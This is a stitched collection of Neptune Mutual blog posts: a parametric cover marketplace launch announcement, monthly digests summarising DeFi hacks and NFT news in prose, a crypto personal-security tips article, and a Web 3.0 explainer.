the blockchain projects and applications that create parametric covers for their communities.</li><li><strong>Cover Purchasers</strong> – These are the individuals and institutions that purchase cover policies offered by the cover creators.</li><li><strong>Liquidity Provider</strong> – These stakeholders supply liquidity to cover pools, which are then used to underwrite cover policies in the marketplace.</li><li><strong>Incident Reporter</strong> – These stakeholders are responsible for reporting and verifying incidents that may trigger payouts.</li></ul><p>As additional utility of the NPM token is being developed, the marketplace will launch before the NPM Token Generation Event (TGE). This means that an interim reporting and incident resolution will be used until such time as NPM tokens are in circulation and NPM token holders are available to participate, as Incident Reporters.</p><p>The interim reporting and incident resolution will be based on the existing model, albeit with PoT (proof of authority tokens) as opposed to NPM tokens. PoT tokens will be held by a small and limited “community” and the process will be governed by the Neptune Mutual Association.</p><p>You can learn more about the Neptune Mutual ecosystem <a href="https://blog.neptunemutual.com/the-neptune-mutual-ecosystem/">here</a>.</p><h2 id="neptune-mutual-parametric-marketplace">Neptune Mutual Parametric Marketplace</h2><p>Our parametric marketplace offers a new approach to mitigating the risk of hacks of CeFi, DeFi and Metaverse digital assets. Cover policies will be available for a range of well-known projects, including: AAVE, Balancer, Curve, Gnosis-Safe, Uniswap V2, maker DAO and Synthetix. We hope cover creators will be adding to the cover products available in the marketplace over the coming months.</p><p>We have designed the marketplace in a way that the claims process, based on the validation of a hack event as opposed to individual loss claims, should appeal to cover purchasers.</p><p>Similarly, we hope that liquidity providers are attracted by the transparent nature of the stablecoin pools that are decoupled from the influence of price volatility from project tokens. This transparency should help LPs make decisions when weighing up the risk/return investment associated with providing liquidity to each respective cover pool.</p><p>Perhaps one of the most important, and often overlooked, aspects of liquidity provision in the cover protection sector is that of an exit strategy for LPs. We have provided a solution to this by allowing LPs a regular and recurring window of opportunity to exit their position, if so desired.</p><p>Our team worked hard to bring forward the launch of Diversified Cover Pools to coincide with the mainnet launch. We believe Diversified Cover Pools will complement the Dedicated Cover Pools, as they provide LPs the option to select either leveraged or unleveraged cover pools depending on their risk/return appetite, and depending on the market sector they are interested in.</p><h2 id="what-covers-are-available">What Covers Are Available?</h2><p>Users will be able to access both dedicated and diversified cover pools on Neptune Mutual. Dedicated cover pools means the underwriting capital in the pool is only available to a single cover project. Popular blockchain projects or protocols that handle high-value transactions and have large communities will benefit from dedicated cover pools. <br></p><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/11/neptune-mutual-dedicated-cover-pool.png" class="kg-image" alt loading="lazy" width="799" height="493" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/11/neptune-mutual-dedicated-cover-pool.png 600w, https://blog.neptunemutual.com/content/images/2022/11/neptune-mutual-dedicated-cover-pool.png 799w" sizes="(min-width: 720px) 720px"></figure><p>On the other hand, <a href="https://blog.neptunemutual.com/diversified-cover-pools-increase-the-options-available-to-liquidity-providers-and-cover-purchasers-alike-is-this-the-route-to-scaling-adoption-of-digital-asset-cover-protection/">diversified cover pools</a> supply liquidity to a basket of cover products.  There are a range of differences between dedicated and diversified pools, both for policyholders and LPs, and these have been covered in depth in our blog articles.</p><p>Each cover product in this basket relates to a specific project and has its own card in the marketplace, as well as its own specific cover policy trigger parameters.</p><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/11/neptune-mutual-diversified-cover-pool.png" class="kg-image" alt loading="lazy" width="799" height="589" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/11/neptune-mutual-diversified-cover-pool.png 600w, https://blog.neptunemutual.com/content/images/2022/11/neptune-mutual-diversified-cover-pool.png 799w" sizes="(min-width: 720px) 720px"></figure><h3 id="using-the-parametric-cover-marketplace"><br>Using the Parametric Cover Marketplace</h3><p>There are several <a href="https://www.youtube.com/c/NeptuneMutual/videos">video tutorials</a> available if you need a refresher before the mainnet launch.

We’re pleased to announce that after months of back-end programming, rigorous testing, security code audits, and updates, the Neptune Mutual parametric cover protocol is launching on the mainnet in November. Keep checking back on our social media channels across Discord, and Twitter for news of the exact launch date.</p><p>For our community members who have supported us since Day 1, we’re proud to make this project a reality, and we’d like to say thank you for your continued support as we safeguard DeFi, CeFi, and Web3 communities against smart contract hacks.</p><h3 id="how-does-the-neptune-mutual-marketplace-work">How does the Neptune Mutual marketplace work?</h3><p>We’ve made it as simple as possible to obtain parametric cover for your digital assets. Blockchain projects create cover policy products for their communities. You buy the cover policy that you need based on the digital assets that you own.</p><p>Parametric cover means policy payouts are based on the occurrence of predefined parameters and trigger events, as opposed to individual claims. This makes policy payouts fast and reliable when incidents are validated.</p><p>You can also participate in the Neptune Mutual parametric cover marketplace as a liquidity provider. Supply liquidity to cover pools and earn a percentage of the cover fees paid by policyholders.</p><h2 id="testnet2-launch">Testnet2 Launch</h2><p>On October 8th, 2022, we <a href="https://blog.neptunemutual.com/neptune-mutuals-gamified-testnet-now-live-on-avalanche/" rel="follow">announced</a> that the gamified testnet of the Neptune Mutual protocol was live on Avalanche’s Fuji (C-Chain) network. There were lots of exciting rewards to be won for participating in the various stakeholder roles and we will be announcing winners shortly.</p><p>Even though the Gleam competition is now over, the testnet will remain active so that it can be used as a learning resource.</p><p>The current URL for the testnet is <a href="https://test.neptunemutual.com/" rel="follow">test.neptunemutual.com</a> however do please join our Discord channel to stay up to date as this may change.</p><h2 id="new-entity">New Entity</h2><p>The Neptune Mutual marketplace is moderated and operated by the <a href="http://neptunemutualassociation.org/" rel="nofollow noopener noreferrer">Neptune Mutual Association</a>.</p><p>Located in Zug, Switzerland, this not-for-profit entity is responsible for overseeing the correct operation of the event reporting and incident resolution process, as well as protecting the integrity of the Neptune Mutual ecosystem.</p><p>Learn more <a href="https://blog.neptunemutual.com/the-neptune-mutual-ecosystem/" rel="follow">here</a>.</p><h2 id="blog-digest">Blog Digest</h2><p>In October, we brought you more <a href="https://blog.neptunemutual.com/tag/exploit-analysis/" rel="follow">exploit analyses</a> from hacks executed in the blockchain industry.

As a result, the need for fast, reliable, and scalable solutions from the decentralized insurance industry is likely to grow.</p><h2 id=\"blockchain-hacks\">Blockchain Hacks</h2><p>ULME, a token on Binance Smart Chain BNB Chain, was attacked by a hacker who allegedly gained approximately 50,646 BUSD. The underlying source of the vulnerability is an indirect price manipulation using flash loans resulting from unrestricted access control. The attacker initially used flash loans to borrow 1,000,000 BUSD. They then swapped the borrowed BUSD for $ULME tokens on PancakeSwap. The attacker then called the buyMiner function of the $ULME token contract, passing in the list of users, and their corresponding amount. This action triggered the price increase, after which they swapped the $ULME token for BUSD, returned the amount borrowed during the flash loan, and kept the remaining profit of 50,646 BUSD. In our <a href=\"https://blog.neptunemutual.com/decoding-ulme-token-flash-loan-attack/\" rel=\"follow\">blog post</a>, we provide a detailed analysis of the exploit.</p><p>Melody, a play to earn web3 entertainment, and social media application, was hacked resulting in the loss of approximately 2225 $BNB tokens. The root cause of the attack is that the application's token address was compromised which allowed the hacker to bypass the access control. The hacker initially invoked the coinWithdraw function of the SGS contract, which is used to redeem the user's assets from the contract. The attacker then withdraws the tokens from the contract to an address, and then sends a total of 990,000 tokens to the attacker's address. The hacker most likely obtained the signeraddress to generate the signature of the malicious action, transferring $SGS tokens to them. We've decoded a detailed analysis of the exploit <a href=\"https://blog.neptunemutual.com/decoding-melody-vulnerability/\" rel=\"follow\">here</a>. </p><p>Team Finance, a security toolkit for founders who want to create a token and raise funds from investors, was exploited for approximately $14.5 million worth of tokens. The vulnerability is caused by a lack of proper validation in the contract's function, which resulted in the addition of a fake token to the contract, which was then used as a parameter to migrate the tokens from the pool. The migrate function of the LockToken contract didn’t properly validate the _id and other parameters of the said function. A fake token was locked, and the attacker arbitrarily specified the token pair to migrate the liquidity amount of the locked fake token. The perpetrator took this opportunity to illegally migrate $WTH, $CAW, $USDC, $TSUKA tokens from V2 to V3 liquidity pool.</p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs </h2><p>DC Comics, the American comic book publisher is entering a new phase in its web3 expansion with the announcement of DC Collectible Comics. The NFT comics will feature weekly releases and can be purchased, sold, and traded via the fan NFT marketplace at nft.dcuniverse.com. To kickstart the new venture, DC Collectible Comics has released Superman #1. Notably, the NFTs will be divided into Legacy and Modern categories. Legacy comics are releases of classic comics that have been out of print for years, such as the legendary Superman #1. However, the Modern comics will include more recent releases from the extensive collection of DC comics. The rarity and grading of the NFT comics are intriguing features of the digital artifacts. There are five different rarity categories: common, uncommon, epic, and legendary.</p><p>Twitter, in cooperation with four marketplaces, said that users would be able to purchase, trade, and display NFTs directly through tweets. The integration, which is still in testing, works with marketplaces from four particular partners: the Solana-centric marketplace Magic Eden, the multi-platform NFT marketplace protocol Rarible, Flow blockchain creator Dapper Labs, and the sports-centric platform Jump.trade. Collectively, these marketplaces cover multiple blockchain networks, such as Ethereum, Solana, Flow, Polygon, Tezos, and Immutable X. The integration, branded NFT Tweet Tiles, displays the artwork of an NFT in a dedicated panel within a tweet and includes a link to let users click through to a marketplace listing.</p><p>Apple has released guidelines to help developers create and facilitate in-app purchases of NFTs in their iOS apps. Apple users will be able to trade NFTs directly from the app, using an in-app purchase feature that will allow them to mint, list, and transfer NFTs. Apple stated in the updated App Store review guidelines that developers will be able to issue NFTs on their apps however they are not permitted to include features that direct users to purchase NFTs from other platforms. Furthermore, apps are not permitted to unlock additional functionality involving cryptocurrencies and cryptocurrency wallets.</p><p>Visa becomes yet another organization planning for a future metaverse in which individuals spend a great deal of time in virtual worlds, exchanging virtual currency for virtual commodities, and collecting digital items. According to Mike Kondoudis of the United States Patent and Trademark Office, the company submitted two applications. The filings include software for auditing digital, virtual, and cryptocurrencies, software for managing digital assets via a digital wallet, including verifying digital transactions and storing NFTs, and software to establish virtual environments where users can connect for entertainment or recreation in a virtual world.</p><p>Gucci's Gucci Vault Land store in The Sandbox is now open for business. The Gucci space will now be open to the public for free until November 9. Users will be able to have fun, learn, and unwind in a stylish Gucci metaverse environment while taking part in this fun and immersive experience. This space celebrates the rare vintage Gucci pieces that were carefully chosen and the conversations between contemporary artists and the Gucci brand. The immersive experience starts when players walk into a beautiful garden surrounded by ancient ruins. Walk through the Grand Entrance hall and stop by the glorious room, with each offering an insight into Gucci Vault’s core pillars.</p><h2 id=\"onchain-insurance-industry-news\">OnChain Insurance Industry News</h2><p>Insurace Protocol has joined hands with Hubble Protocol to provide borrowers with coverage for any smart contract exploits on the protocol.</p><p>Tidal Finance has deployed the user purchase portal for Synthetix smart contract protection coverage.

        html: "<p></p><h2 id=\"introduction\">Introduction</h2><p>If you're like most people, you have a lot of money invested in cryptocurrencies. And if that's the case, then you need to take steps to protect those assets. In this blog post, we will discuss some personal security measures that you can take to protect your crypto investments. We'll talk about hardware wallets, 2FA, and other ways to keep your assets safe. So please read on and learn how to protect your hard-earned money!</p><h3 id=\"hardware-wallets-cold-storage\">Hardware wallets / cold storage</h3><p>Hardware wallets are physical devices that store your private keys and allow you to sign transactions offline. This means that even if your computer is hacked, your coins will still be safe. Ledger and Trezor are two popular hardware wallet brands.</p><h3 id=\"password-manager\">Password manager</h3><p>A password manager is a software that helps you generate and store strong passwords for all your online accounts. This is important because if you use the same password for everything, a hacker only needs to guess it once in order to gain access to all your accounts. LastPass and Dashlane are two popular password managers.</p><h3 id=\"hardware-security-module\">Hardware security module</h3><p>A hardware security module is a physical device that stores cryptographic keys and can perform cryptographic operations. HSMs are used by businesses to secure their data, and they can also be used to protect your crypto assets.</p><h3 id=\"keep-your-software-up-to-date\">Keep your software up to date</h3><p>It's important to keep your operating system and software up to date in order to patch any security vulnerabilities that may exist.</p><h3 id=\"use-a-vpn\">Use a VPN</h3><p>A VPN encrypts your traffic and routes it through a server in another location, making it much harder for hackers to snoop on your activities or steal your data.<br></p><h3 id=\"be-safe-from-phishing-attacks\">Be safe from Phishing attacks</h3><p>Phishing attacks are a common way for hackers to gain access to people's accounts. They will send you an email or message with a link that looks legitimate, but when you click on it, it will take you to a fake website where they will steal your login credentials. So always be careful about clicking on links from unknown sources.<br></p><h4 id=\"origin-binding-defence-against-phishing\">Origin binding: defence against phishing</h4><p>With the U2F-enabled Security Key, such as a YubiKey, user login is bound to the origin, meaning that only the real site can authenticate with the key. &nbsp;Authentication will fail on fake sites even if the user was fooled into thinking it was real. This greatly reduces the risk of phishing<a href=\"https://www.yubico.com/resources/phishing/\" rel=\"nofollow noopener noreferrer\"> attacks </a>and stops account takeovers.</p><p><strong>2FA (Two Factor Authentication)</strong><br>Two-factor authentication is an extra layer of security that requires you to enter a code from your phone in order to access your account. This makes it much harder for hackers to gain access to your funds. &nbsp; Google Authenticator is one of the most well known 2FA applications which runs on your mobile phone. &nbsp;The problem is that if your mobile phone is compromised, Google Authenticator and SMS 2FA will be insufficient to protect your accounts.</p><h4 id=\"what-is-a-sim-swap-attack\"><strong>What is a Sim swap attack?</strong></h4><p>A sim swap attack is a type of fraud that occurs when someone tricks your phone carrier into giving them your phone number. &nbsp;SIM swap attacks hijack a core weakness surrounding mobile phones and authentication. Specifically, SIM swap hacks target phone numbers and use them to steal passwords, financial data, cryptocurrencies and other valuable items.</p><p>Various businesses, particularly those transitioned online, have placed phone numbers at the heart of customer authentication. Many sites allow users to reset passwords using a one-time SMS code. To successfully mount an attack on this kind of account, all the scammer needs is access to the mobile phone number of the target—nothing more. Phone numbers were never intended to be used as identity documents this way.<br></p><p>So how can you protect yourself from a sim swap attack? &nbsp;The answer is better two-factor authentication. Physical authentication techniques are superior to standard 2FA, because they require something you know, such as a password, plus something you have: a physical token or fingerprint (Yubikey). A hacker has to have both your phone/laptop and your Yubikey which is validated with fingerprint recognition.</p><h3 id=\"conclusion\">Conclusion</h3><p>There are many different ways you can protect your crypto assets, and it's important to take as many precautions as possible. By following the tips in this article, you can help ensure that your coins are safe from hackers and thieves. hardware wallets, 2FA, cold storage, password manager, &nbsp;multi-signature hardware security module , keep your software up to date, use a VPN , don't click on links from unknown sources. <br></p><p>These are all great ways to protect your investment!

        html: "<h2 id=\"tldr\">TL;DR <br></h2><ul><li>Warner Bros has announced the release of Lord of the Rings NFTs.</li><li>Lamborghini has unveiled yet another World Tour themed NFT collectibles.</li><li>W3E is preparing to host the world's first live web3 eSports tournament. &nbsp;<br></li></ul><p>NFTs have evolved as a diverse digital asset class with applications in various sectors of the economy. As fans pay to acquire digital collectibles of their memorable events, NFT adoption has grown significantly across multiple industries including art, sports, music, games, and many others. Many businesses have also used NFTs to reward their loyal customers.</p><h2 id=\"blockchain-hacks\">Blockchain Hacks</h2><p>BitKeep, a decentralised multi-chain cryptocurrency wallet, suffered a $1 million loss due to an exploit on BNB Chain via a service used to swap tokens. The vulnerability was exploited due to a flaw in BitBTC code, in which the contract used a custom bridge rather than the standard bridge provided by Optimism. Later, the team communicated and worked with major security agencies to track down the hackers and recover the stolen assets. Following the incident, they suspended their Swap service to ensure that no other asset security issues occurred again. In our <a href=\"https://blog.neptunemutual.com/decoding-bitkeeps-smart-contract-vulnerability/\" rel=\"follow\">blog post</a>, we provide a detailed analysis of the exploit.<br></p><p>Moola Market, a non-custodial liquidity protocol on the Celo ecosystem, was exploited for $9.1 million. The exploit involves draining 8.8 million $CELO tokens worth $6.6 million, 765k $cEUR tokens worth $0.7 million, 1.8 million $MOO tokens worth $1.2 million, and 644k $cUSD tokens worth $0.6 million. The attacker manipulated the price of the low-liquidity native $MOO token by purchasing a portion of it, and then used it as collateral to borrow $CELO tokens back and forth in order to steal the funds. After the announcement of the incident, the team halted all the activity on Moola. A bounty payment was announced in exchange for returning the funds within the next 24 hours of the incident, after which 93.1% of stolen funds were returned to the Moola governance multi-sig. We've decoded a detailed analysis of the exploit <a href=\"https://blog.neptunemutual.com/decoding-moola-markets-price-manipulation-attack/\" rel=\"follow\">here</a>. <br></p><p>Plantworld, a Binance Smart Chain (BSC) BEP-20 token, was the victim of a flash loan attack due to a flaw in transfer logic, resulting in a profit of 24,475 $BUSD for the hacker. The vulnerability was caused by the hackers' ability to use a flash loan to reduce the balance of the PLTD contract in Cake-LP to 1 and then swap all of the $BUSD into the attack contract using the $PLTD tokens. The perpetrator obtained 690,000 $BUSD and repaid the loan's 666,00 $BUSD, retaining the remaining profit of approximately 24,475 $BUSD. We highlighted the detailed analysis of the exploit in <a href=\"https://blog.neptunemutual.com/decoding-plantworlds-vulnerability/\" rel=\"follow\">one of our blog</a> posts.<br></p><p>Layer2DAO, a decentralised organisation focused on driving the future of the Ethereum Layer2 ecosystem was targeted by a hacker, who gained access to a Layer2DAO multisig on Optimism to drain 49,950,000 $L2DAO tokens. The perpetrator dumped a portion of the stolen tokens, but the team were able to negotiate and repurchase the remaining 31,239,677 tokens. The team took to a Tweet to mention that they will be evaluating additional opportunities to help support the token price over the coming days.</p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs</h2><p>Warner Bros. has announced that NFTs for the iconic 2001 film Lord of the Rings - Fellowship of the Ring will be available at web3.wb.com. Each NFT includes a 4K copy of the film, hours of bonus behind-the-scenes footage, a plethora of behind-the-scenes stills, and exclusive AR collectible assets inspired by the film. Eluvio, a Web3 company, created the NFTs and hosts them, along with all of the content data, on its Ethereum-compatible Content Fabric blockchain. Each NFT in the Lord of the Rings collection grants the holder the right to view the film footage in the same way that purchasing a BluRay DVD would do.</p><p>Roofstock, the real estate platform, has completed the sale of a three-bedroom property as a NFT for $175,000. The rental property at Cottage Lake Way in Columbia was sold on the Roofstock onChain NFT marketplace by transferring the Home onChain identity to the house buyer's Ethereum address. According to the company, each rental property is owned by a limited liability company, the details of which are encoded as an NFT on the Ethereum blockchain. When the underlying property's ownership changes, the Home onChain identity can be easily transferred.</p><p>Automobili Lamborghini will be releasing its third collection of World Tour-themed NFT digital collectibles as part of The Epic Road Trip series. The drop, designed in conjunction with Web3 Pro and INVNT.ATOM, is scheduled to drop on the nft.lamborghini.com platform on October 24. This next limited edition NFT from Lamborghini will be issued over four consecutive days, with the first three days seeing the release of 3 Limited Edition Base NFTs. These Base Edition NFTs will cost $196.30 each and be limited to 1,963 units. On October 27th, a total of 63 Limited Edition or Rare NFTs will be available for purchase. This uncommon NFT will cost $1,963 and has the potential to unlock collector-exclusive goodies.</p><p>W3E will be welcoming the web3 gaming community to Istanbul Blockchain Week. The event, which will take place on November 17 at the ESA Esports Arena in the centre of Istanbul, will also feature game displays, special developer announcements, demo testing, and a thrilling competition in one of the most well-known web3 games in the world. On the periphery of the W3E Tournament, W3E will also feature the first ever web3 gaming exhibition. EV.io, a first-person shooter set in a series of futuristic arenas on the Solana blockchain, will be the event’s league partner and lead game for the tournament. Top-ranked teams from Europe and Turkey will be invited by W3E to compete live in a white-knuckle event.</p><h2 id=\"onchain-insurance-industry-news\">OnChain Insurance Industry News</h2><p>Nexus Mutual has announced a collaboration with Sherlock Protocol to expand their incentive-aligned auditing services.

It is used to describe Internet sites that support blockchain transactions, often in a peer-to-peer decentralized context.   At the heart of Web 3.0 is the idea of an alternative approach to transactions, trust, and data.  This new model offers the prospect of moving away from the highly concentrated power of centralized tech firms wielded by the likes of Google, Youtube, Netflix, Facebook, and Amazon.</strong></p><p><strong>But what exactly is it, how is it different, and why does it matter? Let's dive into the details.</strong></p><p><br>When blockchain technology started making waves in 2008, no one could predict the extent of its use cases. It started with recording transaction data on an immutable public ledger where miners were incentivized to validate transactions and add blocks of data to the blockchain; these proof-of-work incentives were, and still are, the basis of many digital cryptocurrencies, including Bitcoin.</p><p>Blockchain has been responsible for numerous projects with good use cases in the Internet space. Aside from cryptocurrency, blockchain has been the technology underlying NFTs (non-fungible tokens), DeFi (decentralized finance), Metaverse, and the revolutionary Web 3.</p><p>To understand Web 3.0 better, let's do a quick review of the evolution of the web.</p><h2 id=\"evolution-of-the-web\">Evolution of the Web</h2><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/evolution-of-internet.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"2000\" height=\"733\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/evolution-of-internet.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/evolution-of-internet.png 1000w, https://blog.neptunemutual.com/content/images/size/w1600/2022/11/evolution-of-internet.png 1600w, https://blog.neptunemutual.com/content/images/2022/11/evolution-of-internet.png 2000w\" sizes=\"(min-width: 720px) 720px\"></figure><p>The World Wide Web (www) was reportedly developed by a computer scientist, Tim Berners-Lee, in 1990.

In this form, the web is a “static” form of content publication whereby hosts push information out to readers who are passive in the way they “consume” this content.</p><p>It is basically a one-way information highway from publisher to reader.</p><p>This was consistent with Berners-Lee's concept of a portal to enable fellow scientists to document and publish their ideas. As web browsers and Internet infrastructure evolved in the mid-'90s, so access to content publishing opened up to a much wider group of users, leading eventually to what we now call Web 2.0, dominated by user-generated content platforms.</p><h3 id=\"web-20-read-write\">Web 2.0 (Read-Write)</h3><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/web2.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"2000\" height=\"1125\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/web2.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/web2.png 1000w, https://blog.neptunemutual.com/content/images/size/w1600/2022/11/web2.png 1600w, https://blog.neptunemutual.com/content/images/2022/11/web2.png 2000w\" sizes=\"(min-width: 720px) 720px\"></figure><p><br>The concept of Web 2.0 was introduced around 2004/2005 bringing with it a paradigm shift in how people used the Internet.</p><p>Web 2 enabled users to interact and communicate with fellow users and become the principal producers of content and, in so doing, exponentially increased the amount of content published to the web.   The interactions of users with content created data.

Web 2.0 innovations were further driven by the developments in mobile applications, games, and social media.</p><h3 id=\"limitations-of-web-20\">Limitations of Web 2.0</h3><p>For all its features, Web 2.0 is not without its limitations. These include:</p><ul><li><strong><strong><strong>Centralized Point of Failure: </strong>Web 2 operates using a client-server model. If these servers go down at any time, people cannot access or interact with the Web 2 site or app. An example of this is the <a href=\"https://www.facebook.com/business/news/update-about-the-october-4th-outage\">Facebook outage of October 2021.</a></strong></strong></li><li><strong>Permission Issues:</strong> You can only access Web 2 websites and apps if the company or server lets you. Also, these companies have access to your data and can sell it to advertisers who then flood your browsing experience with annoying ads left and right.</li><li><strong>Hacks and exploits:</strong> What’s worse than websites using your data to target you for ads? Having that data in the hands of hackers and criminal elements on the web. Essentially, you’re trusting the Web 2 app to safeguard your data, but in the event of a breach, you’ve got everything to lose.</li></ul><p>These limitations, along with the emergence of blockchain technology, led developers to start thinking of even better ways to improve web experience in the digital age. This led to what we now call Web 3.0.</p><h3 id=\"web-30-read-write-own\">Web 3.0 (Read-Write-Own)</h3><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/web3.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"2000\" height=\"663\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/web3.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/web3.png 1000w, https://blog.neptunemutual.com/content/images/size/w1600/2022/11/web3.png 1600w, https://blog.neptunemutual.com/content/images/2022/11/web3.png 2000w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Web 3.0 (or Web 3) is the third generation of the web that is touted to replace Web 2.0.</p><p>In Web 3, content creators and web users own their data, as well as other digital assets, stored in a variety of ways either on or offline.</p><p>As users create content on the Web 3, different business models are emerging that allow them to use this digital asset and to monetise it, rather than allowing the data to be centralized and monetised by the highly dominant companies of Web 2.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/web3-timeline.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1464\" height=\"1142\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/web3-timeline.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/web3-timeline.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/web3-timeline.png 1464w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Source: Silicon Valley Bank</figcaption></figure><h3 id=\"how-users-own-on-web-3\">How users own on Web 3</h3><p>Imagine you're playing an online game on a Web 3 application and you have lots of in-game collectibles.

Even with the added security features brought about by decentralization and smart contracts, Web 3 projects are still subject to a number of risks that can, and often do, cause significant loss of digital assets.</p><p>Chief among them is the risk of hacks as a result of code manipulation.  If you’ve been keeping up with blockchain events, you probably already know that hacks of blockchain and Web 3.0 projects have been on the rise in recent years.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/total-loss-hack-2012-2021.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1450\" height=\"930\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/total-loss-hack-2012-2021.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/total-loss-hack-2012-2021.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/total-loss-hack-2012-2021.png 1450w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Chart showing biggest DeFi hacking incidents | Source: <a href=\"https://cointelegraph.com/news/cointelegraph-consulting-recounting-2021-s-biggest-defi-hacking-incidents\">cointelegraph.com</a></figcaption></figure><p>What’s even more worrying is that most of these hacks were carried out on dApps and protocols that had undergone code audits, in addition to other industry-standard security measures.</p><h3 id=\"our-parametric-cover-solution\">Our Parametric Cover Solution</h3><p>Parametric cover policies have been mitigating risks in real-world events like earthquakes, wildfires, and flooding for decades.

If the event did occur, policyholders receive a payment. If the event did not occur, there is no payout.

Hackers, and exploiters have grossed over $3 billion across more than 125 major hacks so far in 2022. More than $700 million has been stolen from DeFi protocols across 11 different hacks this month alone. The attack vectors range from bridge exploit, market manipulation, to flash loan attack thereby draining millions in assets from these protocols.</p><h2 id=\"blockchain-hacks\">Blockchain Hacks</h2><p>Hackers were able to drain funds from Mango Markets through price manipulation, resulting in a $116 million loss of assets. The vulnerability appears to have been caused by the hackers' ability to manipulate collateral due to an economic design flaw, in which they temporarily increased the value of their collateral and then borrowed massive loans from the Mango treasury. Following the exploit, the Mango program instructions were frozen to prevent any further interaction with the protocol, such as depositing additional funds that may be lost. This incident effectively depleted all available liquidity, preventing protocol users with deposits from withdrawing assets. We have outlined the detailed analysis of the exploit in <a href=\"https://blog.neptunemutual.com/decoding-mangos-vulnerability/\" rel=\"follow\">our blog post</a>.<br></p><p>Stax Finance, a TempleDAO-powered decentralized application, was hacked, costing them approximately $2.36 million. The primary cause of this incident is a lack of permission checks in the StaxLPStaking contract's migrateStake function. The hacker made his own Smart Contract, which only has a migrateWithdraw function with no other code. Then, before taking off the stolen funds, he called the migrateStake function with his own smart contract and the maximum amount possible to withdraw. The exploiter then closed the Uniswap position and sold everything for ETH. To learn more about the exploit, check our blog post <a href=\"https://blog.neptunemutual.com/decoding-stax-finances-vulnerability/\" rel=\"follow\">here</a>.<br></p><p>Rabby was the victim of a smart contract exploit in which the hacker stole 114 ETH valued at $146,000 and 179 BNB valued at $48,500, totaling a loss of approximately $200,000. The root cause of the vulnerability is the contract's token exchange function, which was called externally via the functionCallWithValue function in the OpenZeppelin Address library. The target contract and call data could be passed in by the user, but the contract did not validate the user-passed arguments, resulting in an arbitrary external call issue. This is what the attacker took advantage of to steal money from users who have approved the swap contract. The attacker has deposited all of the stolen funds into Tornado Cash. The team has advised users to cancel all prior Rabby Swap contract approvals across all chains. In <a href=\"https://blog.neptunemutual.com/decoding-rabbys-smart-contract-vulnerability/\" rel=\"follow\">one of our blog posts</a>, we have provided a detailed analysis of the exploit. &nbsp;<br></p><p>FTX was the victim of a gas-stealing attack, in which the hacker exploited the weakness by free-minting XEN tokens 17,000 times. The amount of loss equates to approximately 81 ETH. The reason for this attack is that FTX does not limit the withdrawal transaction's gas limit while the withdrawal fee is free. Following the attack, the price of XEN tokens has dropped by more than 33%. Through the loophole, the attacker has generated over 100 million XEN tokens. According to reports, the XEN token is also being targeted by a Sybil attack. We have outlined the detailed analysis of this exploit in <a href=\"https://blog.neptunemutual.com/decoding-ftxs-gas-limit-vulnerability/\" rel=\"follow\">one of our blog posts</a>.</p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs</h2><p>Konami, the creator of classic video games such as Metal Gear, is doubling down on its Web3 investments, with a new recruiting drive focusing on the development of a new metaverse and the minting of NFTs. These NFTS can be used in-game as items, as well as to interact with other services and communities to enhance the user experience. The new system, which is presently in development, will leverage an innovative digital distribution mechanism to enable players to purchase and sell NFTs within games.</p><p>Following the rise of the metaverse, an increasing number of automakers have entered the industry to engage with fans and consumers. Formula One (F1) continues to make advances into NFTs and the metaverse area after submitting trademarks prior to the November 2023 Las Vegas Grand Prix circuit. The most recent filing with the United States Patent and Trademark Office (USPTO) revealed that the trademark filings include, among other things, licenses for cryptocurrency, NFTs and crypto marketplaces, retail stores for virtual goods, blockchain financial transactions, cryptocurrency trading, mixed reality environments, and crypto mining.</p><p>India Gate Foods has begun the process of blending art and technology. The brand is digitizing the artwork as tradable NFTs using Blockchain technology. It has inaugurated the NFT legacy gallery in order to uncover and commemorate India's lost art forms for their true consumers.

Gas limits could be set arbitrarily high, but this would have numerous consequences. The transaction size is bounded by the block size. As a result, specifying a gas limit greater than the block's gas limit is pointless.</p><p>Each block has a gas limit. A block gas limit has the advantage of preventing attackers from creating an infinite transaction loop. If a transaction's gas usage exceeds this limit, the transaction will fail.</p><h2 id=\"protocol-and-platform-security\">Protocol, and Platform Security</h2><p>Our security team at Neptune Mutual can validate your platform for DNS and web-based security, smart contract reviews, as well as frontend and backend security.

